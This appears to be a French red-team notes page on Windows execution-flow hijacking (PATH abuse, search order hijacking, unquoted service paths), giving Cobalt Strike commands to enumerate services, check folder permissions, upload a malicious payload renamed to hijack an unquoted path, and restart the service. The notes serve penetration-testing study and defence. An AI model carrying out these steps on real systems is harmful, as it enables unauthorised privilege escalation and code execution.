
- [[#Path environment variable (T1574.007)]]
- [[#Search Order Hijacking (T1574.008)]]
- [[#Unquoted Service Path (T1574.009)]]


# Path environment variable (T1574.007)

Path Abuse basique basée sur la variable d'environnement.


## Cobalt Strike

1. Identifier la variable d'environnement PATH

```
env
```

2. S'il commence par un répertoire custom, identifier les acl sur celui-ci

```
cacls "<absolute_path>"
```


# Search Order Hijacking (T1574.008)

Les différentes API utilisées par Windows afin de lancer les processus peuvent suivre différents ordres de recherche, la variable PATH n'en est qu'une petite partie.

L'API [WinExec](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec) suit cet ordre: 

- The executing directory.
    
- The current working directory.
    
- The System32 directory.
    
- The 16-bit System directory.
    
- The Windows directory.
    
- Directories in the PATH environment variable.

L'API [CreateProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) peut varier dans son ordre de recherche. Si lpApplicationName est fournit alors seul le Current Working Direcotory est recherché. Par défaut tous les services démarrent avec le current working directory définit à C:\Windows\System32 ce qui rend cmd.exe non hijackable par exemple.

Si lpCommandLine est fourni et lpApplicationName ne l'est pas, alors le même ordre que WinExec sera suivi.

Dans ce cas identifier si les droits sur le répertoire d'exécution, autrement dit le répertoire ou se situe l'exécutable permettent d'y écrire et potentiellement hijacker le service.

## Cobalt Strike


```
cacls "<absolute_path>"
```


# Unquoted Service Path (T1574.009)

Ordre d'execution des services dont le path n'est pas quotés
  
- C:\Program
    
- C:\Program.exe
    
- C:\Program Files\Bad
    
- C:\Program Files\Bad.exe
    
- C:\Program Files\Bad Application\Bad
    
- C:\Program Files\Bad Application\Bad.exe
    
- C:\Program Files\Bad Application\Bad Program.exe
    
- C:\Program Files\Bad Application\Bad Program.exe.exe

## Cobalt Strike

Enumérer les services et identifier les path non quotés avec des espaces.

```
sc_enum
```

Vérifier les droits sur les répertoires parent contenant un espace, si possible d'écrire alors possible d'hijacker le programme.

```
cacls "<absolute_path>"
```

Upload l'exécutable malveillant dans le repertoire en question puis le renommer (si le répertoire est Bad Application alors renommer en Bad.exe)

```
upload C:\Payloads\dns_x64.svc.exe
mv dns_x64.svc.exe Bad.exe
```

Stopper le service

```
sc_stop BadWindowsService
```

Le relancer

```
sc_start BadWindowsService
```

Supprimer le service créée

```
rm Bad.exe
```





